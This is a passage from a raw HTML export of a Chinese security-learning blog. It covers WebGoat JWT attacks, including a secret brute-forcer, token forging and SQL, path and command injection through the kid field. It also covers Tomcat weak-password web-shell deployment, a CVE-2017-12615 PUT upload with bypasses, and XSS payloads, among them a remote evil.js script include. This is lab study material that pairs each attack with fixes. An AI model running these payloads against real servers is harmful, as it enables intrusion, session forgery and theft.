class="string">&#x27;path/10000_en_words.txt&#x27;</span></span><br><span class="line">JWT_STR = <span class="string">R&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.m-jSyfYEsVzD3CBI6N39wZ7AcdKdp_GiO7F_Ym12u-0&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    jwt_str = JWT_STR</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(dict_path) <span class="keyword">as</span> f:</span><br><span class="line">            key_ = line.strip()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=key_)</span><br><span class="line">                <span class="comment">#print(&#x27;\r&#x27;, &#x27;\bbingo! found key --&gt;&#x27;, termcolor.colored(key_, &#x27;green&#x27;), &#x27;&lt;--&#x27;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;the key is [&#x27;</span>,key_,<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">                <span class="comment">#print(&#x27;\r&#x27;, &#x27;\bbingo! found key --&gt;&#x27;, termcolor.colored(key_, &#x27;green&#x27;), &#x27;&lt;--&#x27;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;the key is [&#x27;</span>,key_,<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27; &#x27;</span> * <span class="number">64</span>, <span class="string">&#x27;\r\btry&#x27;</span>, key_, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bsorry! no key be found.&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230607191917485.png" alt="image-20230607191917485"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;WebGoat Token Builder&quot;</span>,</span><br><span class="line">  <span class="string">&quot;aud&quot;</span>: <span class="string">&quot;webgoat.org&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1686136171</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1786136231</span>,   <span class="comment"># 修改jwt到期时间</span></span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;tom@webgoat.org&quot;</span>,</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;WebGoat&quot;</span>, <span class="comment"># 按题目要求修改名字</span></span><br><span class="line">  <span class="string">&quot;Email&quot;</span>: <span class="string">&quot;tom@webgoat.org&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Role&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;Manager&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Project Administrator&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">,algorithm=<span class="string">&quot;HS256&quot;</span>,key=<span class="string">&quot;available&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p>将生成的token提交即可</p><p><img src="/../images/image-20230607192326261.png" alt="image-20230607192326261"></p><h3 id="访问令牌和刷新令牌"><a href="#访问令牌和刷新令牌" class="headerlink" title="访问令牌和刷新令牌"></a>访问令牌和刷新令牌</h3><h4 id="形成原因-1"><a href="#形成原因-1" class="headerlink" title="形成原因"></a><strong>形成原因</strong></h4><p>未校验access token和refresh token是否属于同一个用户，导致A用户可使用自己的refresh token去刷新B用户的access token</p><h4 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h4><p>WebGoat JWT 12</p><p>题目给出了Tom的旧token</p><p><img src="/../images/image-20230608205636773.png" alt="image-20230608205636773"></p><p>用jerry访问得到refresh token（密码在源码里）</p><p><img src="/../images/image-20230608205424807.png" alt="image-20230608205424807"></p><p>用jerry的refresh token 去刷新Tom的access token</p><p><img src="/../images/image-20230608210421439.png" alt="image-20230608210421439"></p><p>带上得到的accesstoken，去购物</p><p><img src="/../images/image-20230608210205494.png" alt="image-20230608210205494"></p><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a><strong>修复</strong></h4><p>跟踪哪个access token属于哪个refresh token,还可以检查用户的IP地址或地理位置。</p><h3 id="旧JWT复用"><a href="#旧JWT复用" class="headerlink" title="旧JWT复用"></a>旧JWT复用</h3><p>还是WebGoat JWT 12</p><p><img src="/../images/image-20230607193350002.png" alt="image-20230607193350002"></p><p><img src="/../images/image-20230607193221271.png" alt="image-20230607193221271"></p><h3 id="KID注入"><a href="#KID注入" class="headerlink" title="KID注入"></a>KID注入</h3><p>WebGoat JWT 13</p><p>查看对应源码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span>Jwts.parser().setSigningKeyResolver(<span class="keyword">new</span> <span class="title class_">SigningKeyResolverAdapter</span>() &#123;</span><br><span class="line">                        xxxxxxx</span><br><span class="line">                    &#125;).parseClaimsJws(token);</span><br><span class="line"><span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> (Claims) jwt.getBody();</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;Jerry&quot;</span>.equals(username)) &#123;</span><br><span class="line">    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-final-jerry-account&quot;</span>).build();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;Tom&quot;</span>.equals(username)) &#123;</span><br><span class="line">    <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-final-not-tom&quot;</span>).build();</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-invalid-token&quot;</span>).output(e.toString()).build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑：获取密钥，然后解析token，获得claims中的username，如果为Tom则删除成功。</p><p><strong>关键</strong>：获取密钥的部分</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">SigningKeyResolverAdapter</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] resolveSigningKeyBytes(JwsHeader header, Claims claims) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">kid</span> <span class="operator">=</span> (String) header.get(<span class="string">&quot;kid&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">var</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection()) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 通过查询kid来获得key，很明显存在sql注入</span></span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span>connection.createStatement().executeQuery(<span class="string">&quot;SELECT key FROM jwt_keys WHERE id = &#x27;&quot;</span> + kid + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">      </span><br><span class="line">            <span class="keyword">while</span> (rs.next()) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 返回base64解码后的key</span></span><br><span class="line">            <span class="keyword">return</span> TextCodec.BASE64.decode(rs.getString(<span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">catch</span> (SQLException e) </span><br><span class="line">        &#123;</span><br><span class="line">            errorMessage[<span class="number">0</span>] = e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常的思路是通过对kid参数进行sql注入，伪造key</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> key <span class="keyword">FROM</span> jwt_keys <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;&quot; + kid + &quot;&#x27;</span></span><br></pre></td></tr></table></figure><p>因为Tom的jwt中kid为<code>webgoat_key</code>，说明在jwt_keys表中有一个id的值为<code>webgoat_key</code>。</p><p>所以可以对kid注入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kid: y<span class="string">&#x27; and 1=2 union select id from jwt_keys where id =&#x27;</span>webgoat_key</span><br></pre></td></tr></table></figure><p>这样sql查询的结果就为<code>webgoat_key</code>，即key为<code>webgoat_key</code>，但是因为</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TextCodec.BASE64.decode(rs.getString(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>无法对<code>webgoat_key</code>进行base64解码，就会抛出异常。</p><p>用<code>webgoat_key</code>作为key</p><p><img src="/../images/image-20230608204646391.png" alt="image-20230608204646391"></p><p>通过源码得到真正的key为</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = base64.b64decode(<span class="string">&quot;qwertyqwerty1234&quot;</span>)</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line">token_dict = &#123;</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1529569536</span>,</span><br><span class="line">    <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;WebGoat Token Builder&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">2018905304</span>,</span><br><span class="line">    <span class="string">&quot;aud&quot;</span>: <span class="string">&quot;webgoat.org&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;jerry@webgoat.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;Tom&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Email&quot;</span>: <span class="string">&quot;jerry@webgoat.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Role&quot;</span>: [<span class="string">&quot;Cat&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">key = base64.b64decode(<span class="string">&quot;qwertyqwerty1234&quot;</span>)</span><br><span class="line"><span class="comment"># headers</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">    <span class="comment"># &quot;kid&quot;: &quot;123&#x27; and 1=2 union select id FROM jwt_keys WHERE id=&#x27;webgoat_key&quot;,</span></span><br><span class="line">    <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;webgoat_key&quot;</span>,</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 调用jwt库,生成json web token</span></span><br><span class="line">jwt_token = jwt.encode(payload=token_dict,  <span class="comment"># payload, 有效载体</span></span><br><span class="line">                       key=key,  <span class="comment"># 进行加密签名的密钥</span></span><br><span class="line">                       algorithm=<span class="string">&quot;HS256&quot;</span>,  <span class="comment"># 指明签名算法方式, 默认也是HS256</span></span><br><span class="line">                       headers=headers  <span class="comment"># json web token 数据结构包含两部分, payload(有效载体), headers(标头)</span></span><br><span class="line">                       ).decode(<span class="string">&#x27;ascii&#x27;</span>)  <span class="comment"># python3 编码后得到 bytes, 再进行解码(指明解码的格式), 得到一个str</span></span><br><span class="line"><span class="built_in">print</span>(jwt_token)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230608204947847.png" alt="image-20230608204947847"></p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>选择哪种方法，取决于后端是如何利用kid来找到对应密钥</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">#目录遍历</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span> : <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">#sql注入</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span> : <span class="string">&quot;aaaaaaa&#x27; UNION SELECT &#x27;key&#x27;;-- &quot;</span></span><br><span class="line">#命令执行</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span> : <span class="string">&quot;/path/to/key_file|whoami&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="签名算法更改为对称加密"><a href="#签名算法更改为对称加密" class="headerlink" title="签名算法更改为对称加密"></a>签名算法更改为对称加密</h3><p>JWT中最常用的两种算法为<code>HMAC</code>和<code>RSA</code></p><blockquote><p>HMAC(HS256):是一种对称加密算法，使用秘密密钥对每条消息进行签名和验证<br>RSA(RS256)：是一种非对称加密算法，使用私钥加密明文，公钥解密密文。</p></blockquote><p>如果对方网站原来使用的是RS256，但是泄露了公钥，我们可以使用该公钥生成签名，并且将alg的值改为HS256，因为HS256为对称加密算法，所以网站就会使用该公钥验证签名，自然签名可以通过验证。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://jwt.io/introduction">https://jwt.io/introduction</a></p><p><a href="http://www.xianxianlabs.com/blog/2018/06/03/96.html">http://www.xianxianlabs.com/blog/2018/06/03/96.html</a></p><p><a href="https://www.freebuf.com/vuls/216457.html">https://www.freebuf.com/vuls/216457.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat漏洞</title>
      <link href="/2023/06/01/Tomcat%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/06/01/Tomcat%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>vulhub</p><h2 id="Tomat了解"><a href="#Tomat了解" class="headerlink" title="Tomat了解"></a>Tomat了解</h2><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p><img src="/../images/image-20230228234754791-1686995572132.png" alt="image-20230228234754791"></p><p>webapps</p><p><img src="/../images/image-20230617184342638.png" alt="image-20230617184342638"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. bin目录: 存放一些二进制的文件，例如Tomcat常用的 启动脚本: startup.bat或startup.sh 关闭脚本: shutdown.bat 或 shutdown.sh等等</span><br><span class="line"></span><br><span class="line">2. conf目录: 存放的是Tomcat的配置文件</span><br><span class="line"></span><br><span class="line">server.xml：可以设置端口号、设置域名或IP、默认加载的项目、请求编码</span><br><span class="line">web.xml：部署描述文件，这个web.xml中描述了一些默认的servlet，部署每个webapp时，都会调用这个文件，配置该web应用的默认servlet</span><br><span class="line">context.xml：可以用来配置数据源之类的</span><br><span class="line">tomcat-users.xml：用来配置管理tomcat的用户与权限</span><br><span class="line">Catalina:可以设置默认加载的项目</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3. lib目录: 存放的是全局的jar包</span><br><span class="line"></span><br><span class="line">4. logs目录: 存放的是Tomcat的日志，如果Tomcat出错什么的，就需要在这里的日志中查找问题</span><br><span class="line"></span><br><span class="line">5. temp目录: 存放的是临时性的文件</span><br><span class="line"></span><br><span class="line">6. webapps目录: 存放的是Java的Web项目，要部署的项目就需要放在这个目录当中</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7. work目录: 存放的是由JSP代码翻译的Java代码，以及编译的.class文件</span><br></pre></td></tr></table></figure><h2 id="fofa语法"><a href="#fofa语法" class="headerlink" title="fofa语法"></a>fofa语法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;Apache Tomcat&quot;</span><br><span class="line">server=&quot;Tomcat&quot; </span><br><span class="line"></span><br><span class="line">版本号：在Tomcat后面添加/x.x</span><br></pre></td></tr></table></figure><h2 id="Tomcat漏洞"><a href="#Tomcat漏洞" class="headerlink" title="Tomcat漏洞"></a>Tomcat漏洞</h2><h3 id="manager弱口令-部署war包getshell"><a href="#manager弱口令-部署war包getshell" class="headerlink" title="manager弱口令+部署war包getshell"></a>manager弱口令+部署war包getshell</h3><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>全版本</p><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><blockquote><p>conf&#x2F;tomcat-users.xml中保存了登录凭证，导致可能存在弱口令漏洞，从而能访问Manager APP上传后门。</p></blockquote><p><img src="/../images/image-20230228232924268-1686995572133.png" alt="image-20230228232924268"></p><p>进入manager界面后可以部署war包</p><p>​<img src="/../images/image-20230228232939975-1686995572134.png" alt="image-20230228232939975"></p><blockquote><p>war包为jsp压缩文件（<code>jar cvf xxx.jsp</code>），Tomcat会自动解压，</p><p>如将shell.jsp打包为shell.war，Tomcat会将其解压为&#x2F;shell&#x2F;shell.jsp</p></blockquote><p><img src="/../images/image-20230228233506559-1686995572134.png" alt="image-20230228233506559"></p><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><p>删除manage目录，修改conf&#x2F;tomcat-users.xml中的用户凭证</p><h3 id="put任意文件上传（CVE-2017-12615）"><a href="#put任意文件上传（CVE-2017-12615）" class="headerlink" title="put任意文件上传（CVE-2017-12615）"></a>put任意文件上传（CVE-2017-12615）</h3><h4 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h4><p>全版本</p><h4 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h4><p>conf&#x2F;web.xml文件配置了readonly&#x3D;false，导致可以写文件</p><p><img src="/../images/image-20230625214424587.png" alt="image-20230625214424587"></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/1.jsp/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.174.129:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>693</span><br><span class="line"></span><br><span class="line"><span class="language-dockerfile"><span class="keyword">shell</span></span></span><br></pre></td></tr></table></figure><blockquote><p><strong>需要进行绕过</strong></p><p>Windows：<br>1、利用&#x2F;shell.jsp::$DATA的方式绕过<br>2、&#x2F;shell.jsp%20，空格绕过<br>3、&#x2F;shell.jsp&#x2F; ， Tomcat在处理文件时会删除最后的&#x2F;<br>Linux：<br>1、&#x2F;shell.jsp&#x2F; ， Tomcat在处理文件时会删除最后的&#x2F;</p></blockquote><h4 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h4><p>conf&#x2F;web.xml文件配置readonly值为True或注释该参数</p><h3 id="AJP文件包含-x2F-读取–Ghostcat幽灵猫（CVE-2020-1938）"><a href="#AJP文件包含-x2F-读取–Ghostcat幽灵猫（CVE-2020-1938）" class="headerlink" title="AJP文件包含&#x2F;读取–Ghostcat幽灵猫（CVE-2020-1938）"></a>AJP文件包含&#x2F;读取–Ghostcat幽灵猫（CVE-2020-1938）</h3><h4 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h4><p><img src="/../images/image-20230617182333230.png" alt="image-20230617182333230"></p><h4 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><p><img src="/../images/image-20230913153055256.png" alt="image-20230913153055256"></p><h4 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h4><p>漏洞原理：</p><p><a href="https://mp.weixin.qq.com/s/D1hiKJpah3NhEBLwtTodsg">https://mp.weixin.qq.com/s/D1hiKJpah3NhEBLwtTodsg</a></p><p>脚本：</p><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><p><strong>python2运行</strong></p><p><strong>可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件</strong></p><p><img src="/../images/image-20230617184142564.png" alt="image-20230617184142564"></p><p><img src="/../images/image-20230617184129890.png" alt="image-20230617184129890"></p><h4 id="漏洞检测与修复"><a href="#漏洞检测与修复" class="headerlink" title="漏洞检测与修复"></a>漏洞检测与修复</h4><p><a href="https://www.chaitin.cn/zh/ghostcat">https://www.chaitin.cn/zh/ghostcat</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/2023/06/01/XSS/"/>
      <url>/2023/06/01/XSS/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>主要在 <a href="https://xz.aliyun.com/t/9606">https://xz.aliyun.com/t/9606</a> 基础上进行学习</p><h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p> <strong>跨站脚本</strong>（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。</p><h1 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h1><p><img src="/../images/image-20230524205745342-1686840019396.png" alt="image-20230524205745342"></p><ul><li><p>反射型</p><p>用户输入什么网站返回什么，漏洞成型点在服务器端代码解析引擎</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// 直接将用户输入拼接到html中</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>常见场景：搜索功能等将输入直接回显的场景，通常需要诱导受害者点击才能实现攻击。</p></li><li><p>存储型</p><p>用户输入的数据会先存储到数据库中，只要查询到数据库中的脏数据，这些数据回显到页面就会触发XSS，漏洞成型点在<strong>数据库</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// 获取用户输入</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 防御sql注入（也不全，$name变量没有过滤）</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>( <span class="variable">$message</span> );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 没有考虑到对 XSS 进行过滤,将xss数据存入数据库中</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="comment">// 查询，拼接，触发xss</span></span><br><span class="line">    xxxx；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>常见场景：评论，订单，可以参考sql中的二次注入</p></li><li><p>DOM型</p><p>与服务器无交互，漏洞成型点在**<code>javascript</code>文件解析用户输入时**，触发点在客户端渲染DOM时。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  lang 变量通过 document.location.href（当前页面的 URL）来获取</span></span><br><span class="line"><span class="keyword">var</span> lang = document.location.href.<span class="title function_ invoke__">substring</span>(document.location.href.<span class="title function_ invoke__">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 并且没有任何过滤就直接 URL 解码后输出在了 option 标签中</span></span><br><span class="line">document.<span class="title function_ invoke__">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="variable">$decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><p>常见场景：需要审计<code>javascript</code>代码</p></li></ul><h1 id="如何执行javascript"><a href="#如何执行javascript" class="headerlink" title="如何执行javascript"></a>如何执行javascript</h1><ul><li>script标签</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>非script标签</p><ul><li><p><code>on</code>事件</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&#x27;&#x27;</span> onclick=<span class="string">&#x27;alert(1)&#x27;</span>&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/jsref/dom-obj-event.html">HTML DOM 事件对象 | 菜鸟教程</a></p></li><li><p><code>javascript:</code>  </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&#x27;javascript:alert(1)&#x27;</span>&gt;&lt;/a&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1);</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">&lt;img src=javascript:alert(1)&gt;    //IE7以下</span><br><span class="line">&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>script</code>标签的src属性</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://xxx/evil.js&quot;</span>&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><h2 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h2><p>当空格被过滤了时，我们可以用 <code>/</code> 来代替空格：</p><figure class="highlight js"><table><tr><td class="code"><pre><span 